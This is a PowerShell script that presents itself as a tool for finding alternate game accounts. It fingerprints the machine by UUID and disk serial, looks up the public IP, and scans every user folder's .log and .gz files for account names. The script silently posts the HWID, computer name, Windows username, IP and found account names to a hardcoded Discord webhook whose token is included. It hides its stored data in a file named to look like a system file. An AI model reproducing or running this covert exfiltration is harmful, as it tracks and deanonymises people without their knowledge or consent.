$webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
$adminWebhook = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN" # Same or different webhook for admin alerts
$startPath = "C:\Users"
$hwidPath = "$env:APPDATA\Microsoft\Windows\Caches\system32.dat"
$hwidListPath = "$env:APPDATA\Microsoft\Windows\Caches\hwid_list.dat"

# Get HWID (using multiple identifiers for reliability)
function Get-HWID {
    try {
        $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
        $uuid = $computerInfo.UUID
        $drive = Get-WmiObject Win32_DiskDrive | Where-Object { $_.Index -eq 0 }
        $driveSerial = $drive.SerialNumber
        $hwid = "$uuid-$driveSerial"
        $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid)))
        return $hash -replace '-', ''
    }
    catch {
        return $env:COMPUTERNAME + $env:USERNAME
    }
}

$hwid = Get-HWID

# Check if this HWID is blacklisted/cleared
$clearedHWIDs = @{}
if (Test-Path $hwidListPath) {
    try {
        $encrypted = Get-Content $hwidListPath -Raw
        $bytes = [System.Convert]::FromBase64String($encrypted)
        $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
        $clearedHWIDs = $decrypted | ConvertFrom-Json
    }
    catch {
        $clearedHWIDs = @{}
    }
}

# Load or initialize stored alts
$storedAlts = @{}
if (Test-Path $hwidPath) {
    try {
        $encrypted = Get-Content $hwidPath -Raw
        $bytes = [System.Convert]::FromBase64String($encrypted)
        $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
        $storedAlts = $decrypted | ConvertFrom-Json
    }
    catch {
        $storedAlts = @{}
    }
}

# Send HWID info to admin (first time or periodically)
$hwidInfo = @{
    hwid = $hwid
    computer = $env:COMPUTERNAME
    username = $env:USERNAME
    ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

$hwidMessage = "**HWID INFO**`n**HWID:** $hwid`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**IP:** $($hwidInfo.ip)`n**Time:** $($hwidInfo.timestamp)"
$payload = @{content = $hwidMessage; username = "HWID Tracker"} | ConvertTo-Json
Invoke-RestMethod -Uri $adminWebhook -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue

# If HWID is cleared, delete stored alts
if ($clearedHWIDs.ContainsKey($hwid)) {
    Write-Host "This HWID has been cleared by admin. Resetting stored alts..." -ForegroundColor Yellow
    $storedAlts = @{}
    if (Test-Path $hwidPath) {
        Remove-Item $hwidPath -Force
    }
    
    # Send confirmation to admin
    $clearConfirm = "**HWID CLEARED**`n**HWID:** $hwid has been cleared and reset"
    $clearPayload = @{content = $clearConfirm; username = "HWID Manager"} | ConvertTo-Json
    Invoke-RestMethod -Uri $adminWebhook -Method Post -Body $clearPayload -ContentType "application/json" -ErrorAction SilentlyContinue
}

if (-not (Test-Path $startPath)) {
    exit
}

Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan

$gzFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.gz" -File -Force -ErrorAction SilentlyContinue
$logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force -ErrorAction SilentlyContinue
$allFiles = @($gzFiles) + @($logFiles)

$results = @()
$newAlts = @()

foreach ($file in $allFiles) {
    try {
        $content = $null
        $isGz = $file.Extension -eq ".gz"
        
        if ($isGz) {
            $tempFileName = "$($file.BaseName)_temp_$([guid]::NewGuid().ToString('N')).txt"
            $tempOutput = Join-Path $file.DirectoryName $tempFileName
            
            $inputStream = [System.IO.File]::OpenRead($file.FullName)
            $outputStream = [System.IO.File]::Create($tempOutput)
            $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
            
            $gzipStream.CopyTo($outputStream)
            
            $gzipStream.Close()
            $outputStream.Close()
            $inputStream.Close()
            
            $content = Get-Content $tempOutput -Raw -ErrorAction SilentlyContinue
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        }
        
        $pattern = "Setting user:\s*(\S+)"
        if ($content -and $content -match $pattern) {
            $username = $Matches[1]
            $results += [PSCustomObject]@{
                "Usernames" = $username
                "Path" = $file.FullName
            }
            
            # Check if this is a new alt
            if (-not $storedAlts.ContainsKey($username)) {
                $newAlts += $username
            }
        }
    }
    catch {
        continue
    }
}

# Merge new alts with stored alts
foreach ($alt in $newAlts) {
    $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

# Save updated alts to file (encrypted)
if ($storedAlts.Count -gt 0) {
    $json = $storedAlts | ConvertTo-Json
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $encrypted = [System.Convert]::ToBase64String($bytes)
    Set-Content -Path $hwidPath -Value $encrypted -Force
}

# Display results in console (without paths)
if ($newAlts.Count -gt 0) {
    Write-Host "`nNew alts found on this system:" -ForegroundColor Cyan
    $newAlts | ForEach-Object {
        Write-Host ("  {0}" -f $_) -ForegroundColor Magenta
    }
    
    # Show all alts ever found
    Write-Host "`nTotal alts ever detected on this HWID:" -ForegroundColor Cyan
    $storedAlts.Keys | ForEach-Object {
        Write-Host ("  {0} (First seen: {1})" -f $_, $storedAlts[$_]) -ForegroundColor Yellow
    }
    
    # Send to Discord (only new alts with HWID)
    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n**Computer:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n`n"
    foreach ($username in $newAlts) {
        $message += "`"$username`"`n"
    }
    
    $payload = @{
        content = $message
        username = "Alt Detector"
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
} else {
    Write-Host "No new alts found on this system." -ForegroundColor Yellow
    Write-Host "Previously detected alts for this HWID:" -ForegroundColor Cyan
    if ($storedAlts.Count -gt 0) {
        $storedAlts.Keys | ForEach-Object {
            Write-Host ("  {0} (First seen: {1})" -f $_, $storedAlts[$_]) -ForegroundColor Yellow
        }
    } else {
        Write-Host "  None" -ForegroundColor Gray
    }
}
